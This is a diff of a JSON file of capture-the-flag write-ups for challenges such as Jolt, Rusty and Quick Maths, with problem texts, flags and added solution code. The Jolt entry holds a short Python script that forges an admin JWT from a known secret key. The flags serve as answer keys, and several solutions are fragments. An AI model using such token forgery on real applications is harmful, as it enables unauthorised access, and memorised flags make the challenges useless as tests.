@@ -1,26 +1,13 @@
 {
     "CTF": [
      {
-      "title": "Finders Keepers",
-      "problem": "Patch found a flag! He stored it in his home directory... should be able to keep it?",
-      "Connect": "# Password is \"userpass\"\n ssh -p 30723 user@challenge.ctf.games",
-      "solution": "I connected to the machine and then I used the following command to get the flag: ",
-      "img": [
-       {
-        "name": "Andy Dufresne",
-        "img": "Tim Robbins"
-       }
-      ],
-      "answer":"flag{e4bd38e78379a5a0b29f047b91598add}"
-     },
-     {
         "title": "Finders Keepers",
         "problem": "Patch found a flag! He stored it in his home directory... should be able to keep it?",
         "Connect": "# Password is \"userpass\"\n ssh -p 30723 user@challenge.ctf.games",
         "solution": "I connected to the machine and then I used the following command to get the flag: ",
         "links": [
          {
-          "link": "Andy Dufresne"
+          "link": ""
          }
         ],
         "answer":"flag{e4bd38e78379a5a0b29f047b91598add}"
@@ -39,9 +26,9 @@
     },
     {
         "title": "Rusty",
-        "problem": "We heard you were a bit rusty on the basics... so here's a small warmups challenge for you!\n\nsome code attached and its output. Can you make any sense of it?\n\nOPhMOnVheP1hRaOa1Pmi1GrBbGm21PRaepxXOPxMeG1iOaYd1ji=",
+        "problem": "We heard you were a bit rusty on the basics... so here's a small warmups challenge for you!\n\nHere's some code attached and its output. Can you make any sense of it?\n\nOPhMOnVheP1hRaOa1Pmi1GrBbGm21PRaepxXOPxMeG1iOaYd1ji=",
         "Connect": "",
-        "solution": "To solve this exercise , I used the following code: ",
+        "solution": "To solve this exercise , I used the following code: use std::fs;\\n\\nconst CHARSET: &[u8] = b\"QWlKoxp3mT9EeRb4YzgG6rNj1OLvZ5SDfMBaXtP8JyIFVH07uh2wicdnUAC#@q\";\\n\\nfn main() {\\n    let output = \"OPhMOnVheP1hRaOa1Pmi1GrBbGm21PRaepxXOPxMeG1iOaYd1ji=\";\\n\\n    let mut input = Vec::new();\\n\\n    for &byte in output.as_bytes() {\\n        if byte != b'=' {\\n            let position = CHARSET.iter().position(|&x| x == byte).unwrap() as u32;\\n            for shift in (0..6).rev() {\\n                input.push(((position >> shift) & 1) as u8);\\n            }\\n        }\\n    }\\n\\n    let mut output = Vec::new();\\n\\n    let mut temp = 0u8;\\n    let mut temp_len = 0u8;\\n\\n    for &bit in &input {\\n        temp = (temp << 1) | bit;\\n        temp_len += 1;\\n        if temp_len == 8 {\\n            output.push(temp);\\n            temp = 0;\\n            temp_len = 0;\\n        }\\n    }\\n\\n    let out = String::from_utf8(output).unwrap();\\n\\n    println!(\"{}\", out);\\n}",
         "links": [
          {
           "link": "http://challenge.ctf.games:31512/.well-known/security.txt"
@@ -51,60 +38,60 @@
     },
     {
         "title": "Jolt",
-        "problem": "Jott is the new hottness of productivity applications! Collaborate in real time, share notes, take notes, or don't take notes! We're not your manager. We're not even a real company!\n\nGo ahead and pentest the application and jott down whatever you find.\n\nWe'd like you to do a pretty thorough job, so we've outfitted you with a dev instane of the app. Please use these user level credentials to log in and perform an aunthenticated test.\n\nUsername- john_doePassword - password123\n\nWe also gave you the dev-build of the app in the src directory for reference.",
+        "problem": "Jott is the new hottness of productivity applications! Collaborate in real time, share notes, take notes, or don\u2019t take notes! We\u2019re not your manager. We\u2019re not even a real company!\\n\\nGo ahead and pentest the application and jott down whatever you find.\\n\\nWe\u2019d like you to do a pretty thorough job, so we\u2019ve outfitted you with a dev instane of the app. Please use these user level credentials to log in and perform an aunthenticated test.\\n\\nUsername- john_doe\\nPassword \u2014 password123\\n\\nWe also gave you the dev-build of the app in the src directory for reference.",
         "Connect": "",
-        "solution": "To get the token of the website I used the following code: Then, I modified the jwt value with the value we generated: Once, we enter as a admin we can get the flag:",
+        "solution": "To get the token of the website I used the following code: import jwt\\n\\n# Define the known SECRET_KEY\\nSECRET_KEY = \"jott123!\"\\n# Craft a token with an 'admin' role\\npayload = {\"sub\": \"admin\", \"role\": \"admin\"}\\n# Create a forged JWT token using the known SECRET_KEY\\nforged_token = jwt.encode(payload, SECRET_KEY, algorithm=\"HS256\")\\n# Print the forged token\\nprint(forged_token) Then, I modified the jwt value with the value we generated: Once, we enter as a admin we can get the flag:",
         "links": [
          {
-          "link": "http://challenge.ctf.games:31512/.well-known/security.txt"
+          "link": ""
          }
         ],
         "answer":"flag{c7cc7fa86330cff2c09cea0055289b7e}"
     },
     {
         "title": "Quick Maths",
-        "problem": "To try and get better grades in math, I made a program that gave me timed quizzes. Funny thing is that as I got better at the questions in this test, I got worse grades on my math tests.\n\nNOTE: Float answers are rounded to 1 decimal points.\nNOTE: And here’s another twist… the answers to division questions depend on integer division or double division. I.e.,\n3/5 = 0\n3/5.0 = .6",
+        "problem": "To try and get better grades in math, I made a program that gave me timed quizzes. Funny thing is that as I got better at the questions in this test, I got worse grades on my math tests.\\n\\nNOTE: Float answers are rounded to 1 decimal points.\\nNOTE: And here\u2019s another twist\u2026 the answers to division questions depend on integer division or double division. I.e.,\\n3/5 = 0\\n3/5.0 = .6",
         "Connect": "",
-        "solution": "To solve this exercise, we need to use the following code: Then, we run our script:",
+        "solution": "To solve this exercise, we need to use the following code:\\n\\nimport socket\\n\\nHOST = 'challenge.ctf.games'\\nPORT = 32287\\n\\ndef solve_math_question(question):\\n    parts = question.split()\\n    num1 = float(parts[2])\\n    operator = parts[3]\\n    num2 = float(parts[4].replace('?', ''))\\n\\n    if operator == '/':\\n        if num2.is_integer():\\n            return str(int(num1 // num2))\\n        else:\\n            return str(round(num1 / num2, 1))\\n    elif operator == '+':\\n        return str(round(num1 + num2, 1))\\n    elif operator == '-':\\n        return str(round(num1 - num2, 1))\\n    elif operator == '*':\\n        return str(round(num1 * num2, 1))\\n    else:\\n        return \"Invalid operator\"\\n\\ndef main():\\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\\n        s.connect((HOST, PORT))\\n\\n        try:\\n            while True:\\n                data = s.recv(1024).decode('utf-8')\\n\\n                if \"Do you want to give it a chance? (Y/n):\" in data:\\n                    s.send(b'Y\\n')\\n                elif \"What is\" in data:\\n                    question = data.strip()\\n                    answer = solve_math_question(question)\\n                    s.send(f'{answer}\\n'.encode('utf-8'))\\n                elif \"Awesome, good luck!\" in data:\\n                    continue\\n                elif \"flag\" in data:\\n                    print(data)\\n                    break\\n                else:\\n                    if \"Wrong!\" not in data:\\n                        print(data)\\n                    continue\\n        except KeyboardInterrupt:\\n            print(\"Interrupted. Good bye!\")\\n\\nif __name__ == '__main__':\\n    main()\\nThen, we run our script:",
         "links": [
          {
-          "link": "http://challenge.ctf.games:31512/.well-known/security.txt"
+          "link": ""
          }
         ],
         "answer":"flag{77ba0346d9565e77344b9fe40ecf1369}"
     },
     {
         "title": "Back the Hawks",
-        "problem": "We are Back the Hawks! We’re a non-profit that seeks to protect hawks across the world. We have a vibrant community of Backers who are all passionate about Backing the Hawks! We’d love for you to join us… if you can figure out how to get an access code.\n\nNOTE — any resemblence to other companies, non-profits, services, login portal challenges, and/or the like, living or dead, is completely coincidental.\n\nHint: The JavaScript of this page is doing something interesting.",
-        "Connect": "http://challenge.ctf.games:30114",
-        "solution": "I exanimated the website to check the JavaScript code: According to the javascript , I need to make a post:Then, I got a encrypted message:\n\nCaesar cipher: Output: WE_OUT_HERE_BACKIN_THE_HAWKS_2023\n\nOnce, we get our access code, we can enter in the website:",
+        "problem": "We are Back the Hawks! We\u2019re a non-profit that seeks to protect hawks across the world. We have a vibrant community of Backers who are all passionate about Backing the Hawks! We\u2019d love for you to join us\u2026 if you can figure out how to get an access code.\\n\\nNOTE \u2014 any resemblence to other companies, non-profits, services, login portal challenges, and/or the like, living or dead, is completely coincidental.\\n\\nHint: The JavaScript of this page is doing something interesting.",
+        "Connect": "",
+        "solution": "I exanimated the website to check the JavaScript code:\\n\\n\\n\\nAccording to the javascript , I need to make a post:\\n\\n\\nThen, I got a encrypted message:\\n\\nCaesar cipher:\\n\\n\\nOutput: WE_OUT_HERE_BACKIN_THE_HAWKS_2023\\n\\nOnce, we get our access code, we can enter in the website:",
         "links": [
          {
-          "link": "http://challenge.ctf.games:31512/.well-known/security.txt"
+          "link": ""
          }
         ],
         "answer":"flag{3ef532159716ecfb9117f56f4ead4fb6}"
     },
     {
         "title": "Unhackable Andy",
-        "problem": "Someone might want to let ol’ Andy know the old addage — pride goeth before the fall.",
+        "problem": "Someone might want to let ol\u2019 Andy know the old addage \u2014 pride goeth before the fall.",
         "Connect": "",
-        "solution": "To solve this exercise , we need to access to the login.\n\nThe exercise provided us the repository:\n\nAfter we exanimated we can find the credential to access to the page:\n\nOnce, we access to the page , we can see a command output:\n\nWe only need to do simple Linux commands:\n\nls\n\ncat flag.txt",
+        "solution": "To solve this exercise , we need to access to the login.\\n\\nThe exercise provided us the repository:\\n\\n\\nAfter we exanimated we can find the credential to access to the page:\\n\\n\\nOnce, we access to the page , we can see a command output:\\n\\nWe only need to do simple Linux commands:\\n\\nls\\n\\ncat flag.txt",
         "links": [
          {
-          "link": "http://challenge.ctf.games:31512/.well-known/security.txt"
+          "link": ""
          }
         ],
         "answer":"flag{e81b8885d8a5e8d57bbadeb124cc956b}"
     },
     {
         "title": "Protecting Camp",
-        "problem": "I made a small site to keep a list of things I need to buy to keep me safe before I go camping, maybe it’s keeping some other things safe too!\n\nPsst… Snyk can help solve this challenge! Try it out!",
+        "problem": "I made a small site to keep a list of things I need to buy to keep me safe before I go camping, maybe it\u2019s keeping some other things safe too!\\n\\nPsst\u2026 Snyk can help solve this challenge! Try it out!",
         "Connect": "",
-        "solution": "We need to find the vulnerability using Synk: Then, we checked the code:This is the vulnerable part of the code that we are going to exploit.\n\nUse burpsuit:\n\nModify the request.\n\nLaunch the request:",
+        "solution": "We need to find the vulnerability using Synk:\\n\\n\\nThen, we checked the code:\\n\\n\\nThis is the vulnerable part of the code that we are going to exploit.\\n\\nUse burpsuit:\\n\\nModify the request.\\n\\n\\nLaunch the request:",
         "links": [
          {
-          "link": "http://challenge.ctf.games:31512/.well-known/security.txt"
+          "link": ""
          }
         ],
         "answer":"flag{d716dd8ab70bbc51a5f1d0182c84bcc8}"
